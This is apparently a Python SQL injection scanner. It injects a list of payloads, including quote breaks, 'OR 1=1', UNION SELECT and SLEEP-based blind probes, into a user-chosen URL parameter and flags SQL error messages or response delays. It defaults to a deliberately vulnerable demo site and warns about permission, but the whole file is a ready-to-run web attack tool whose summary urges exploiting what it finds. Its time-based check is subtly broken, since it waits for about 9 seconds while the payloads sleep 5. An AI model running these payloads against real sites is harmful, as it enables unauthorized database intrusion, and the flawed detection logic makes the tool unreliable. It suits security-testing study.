import requests
import time

# --- Configuration ---
# Default target URL and parameter for testing
# IMPORTANT: Use a known vulnerable test application or a controlled environment.
# DO NOT use this script against live, production websites without explicit permission.
DEFAULT_TARGET_URL = "http://testphp.vulnweb.com/listproducts.php?cat=1" # Example vulnerable URL
DEFAULT_TARGET_PARAM = "cat" # Example vulnerable parameter

# Common SQL Injection payloads for basic detection
# This is a very small subset for demonstration. Real tools use extensive lists.
SQL_INJECTION_PAYLOADS = [
    "'",                  # Single quote to break queries
    "''",                 # Double quote to check for error suppression
    " OR 1=1--",          # Always true condition (boolean-based)
    " AND 1=2--",         # Always false condition (boolean-based)
    " UNION SELECT NULL, NULL, NULL--", # Union-based (adjust NULLs based on columns)
    " AND SLEEP(5)--",    # Time-based blind (MySQL/PostgreSQL)
    " AND 1=1 AND SLEEP(5)--", # Time-based blind with true condition
    " AND 1=2 AND SLEEP(5)--", # Time-based blind with false condition
    "\" OR 1=1--",        # Double quote for different contexts
    "\" AND 1=2--",
]

# Common error messages to look for in responses (case-insensitive)
SQL_ERROR_MESSAGES = [
    "You have an error in your SQL syntax",
    "Warning: mysql_fetch_array()",
    "ORA-", # Oracle errors
    "SQLSTATE", # General SQL errors
    "Unclosed quotation mark",
    "Microsoft OLE DB Provider for ODBC Drivers error",
    "error in your SQL statement",
]

# --- Helper Function for Sending and Analyzing Requests ---
def test_payload(url, param_name, original_value, payload, timeout=10):
    """
    Constructs a new URL with the injected payload and sends an HTTP GET request.
    Analyzes the response for SQL error messages or time delays.
    """
    # Construct the new URL with the payload injected into the target parameter
    # Assuming the parameter is in the query string
    if "?" in url:
        base_url, query_string = url.split("?", 1)
        params = {}
        for p in query_string.split("&"):
            if "=" in p:
                key, value = p.split("=", 1)
                params[key] = value
            else:
                params[p] = "" # Handle parameters without values

        params[param_name] = original_value + payload
        
        # Reconstruct the query string
        new_query_parts = []
        for key, value in params.items():
            new_query_parts.append(f"{key}={value}")
        test_url = f"{base_url}?{'&'.join(new_query_parts)}"
    else:
        # If no query string, append directly
        test_url = f"{url}?{param_name}={original_value}{payload}"

    print(f"  Testing: {test_url[:100]}...") # Print truncated URL for readability

    start_time = time.time()
    try:
        response = requests.get(test_url, timeout=timeout)
        end_time = time.time()
        response_time = end_time - start_time
        
        response_text = response.text.lower() # Convert to lowercase for case-insensitive checking

        # Check for error messages
        for error_msg in SQL_ERROR_MESSAGES:
            if error_msg.lower() in response_text:
                print(f"    [!] Potential SQLi (Error-based) with payload: '{payload.strip()}'")
                print(f"        Found error: '{error_msg}'")
                return True # Vulnerability detected

        # Check for time-based blind (if payload contains SLEEP)
        if "sleep(" in payload.lower():
            # A significant delay (e.g., more than 4 seconds for a 5-second sleep) indicates success
            if response_time >= timeout - 1: # Allow for network latency
                print(f"    [!] Potential SQLi (Time-based Blind) with payload: '{payload.strip()}'")
                print(f"        Response time: {response_time:.2f}s (expected delay)")
                return True # Vulnerability detected

        # Basic boolean-based check (requires more sophisticated logic to be truly reliable)
        # For a basic script, we'll just note if content changes significantly.
        # This is very prone to false positives/negatives without a baseline.
        # A more advanced script would fetch a baseline response and compare.
        # For now, we'll rely more on error and time-based.

    except requests.exceptions.Timeout:
        print(f"    [!] Request timed out with payload: '{payload.strip()}'")
        # This could also indicate time-based blind, if the timeout is just over the sleep time
        if "sleep(" in payload.lower():
             print(f"        Consider increasing timeout or it might be time-based SQLi.")
        return False
    except requests.exceptions.RequestException as e:
        print(f"    [!] Request error with payload '{payload.strip()}': {e}")
        return False
    
    return False # No immediate vulnerability detected by this payload

# --- Main SQL Injection Tester Function ---
def run_sql_injection_tester():
    """
    Prompts the user for target details and initiates a basic SQL injection scan.
    """
    print("--- Basic SQL Injection Tester ---")
    print(f"Default target URL: {DEFAULT_TARGET_URL}")
    print(f"Default target parameter: {DEFAULT_TARGET_PARAM}\n")
    print("WARNING: Only use this script on targets you have explicit permission to test.")
    print("This is a basic tester and may not find all vulnerabilities or avoid WAFs.\n")

    target_url = input(f"Enter target URL (e.g., {DEFAULT_TARGET_URL}): ").strip()
    if not target_url:
        target_url = DEFAULT_TARGET_URL

    target_param = input(f"Enter target parameter (e.g., {DEFAULT_TARGET_PARAM}): ").strip()
    if not target_param:
        target_param = DEFAULT_TARGET_PARAM

    # Extract the original value of the target parameter from the URL
    original_value = ""
    if "?" in target_url:
        query_string = target_url.split("?", 1)[1]
        for p in query_string.split("&"):
            if p.startswith(f"{target_param}="):
                original_value = p.split("=", 1)[1]
                break
    
    if not original_value:
        print(f"Could not find original value for parameter '{target_param}' in the URL.")
        print("Please ensure the parameter is present in the URL's query string.")
        return

    print(f"\nStarting SQL Injection scan on {target_url} with parameter '{target_param}'...")
    print(f"Original parameter value detected: '{original_value}'")

    vulnerabilities_found = []
    
    for payload in SQL_INJECTION_PAYLOADS:
        print(f"\nAttempting payload: '{payload.strip()}'")
        if test_payload(target_url, target_param, original_value, payload):
            vulnerabilities_found.append(f"Payload: '{payload.strip()}'")
            # In a real scanner, you might stop here or try more specific payloads
            # For this basic script, we'll continue to show all detections

    print("\n--- Scan Summary ---")
    if vulnerabilities_found:
        print(f"Found {len(vulnerabilities_found)} potential SQL Injection vulnerabilities:")
        for vuln in vulnerabilities_found:
            print(f"- {vuln}")
        print("\nFurther manual testing is recommended to confirm and exploit these findings.")
    else:
        print("No obvious SQL Injection vulnerabilities detected with the provided payloads.")
        print("This does not guarantee the site is secure; more advanced techniques may be required.")

# Entry point for the script
if __name__ == "__main__":
    run_sql_injection_tester()
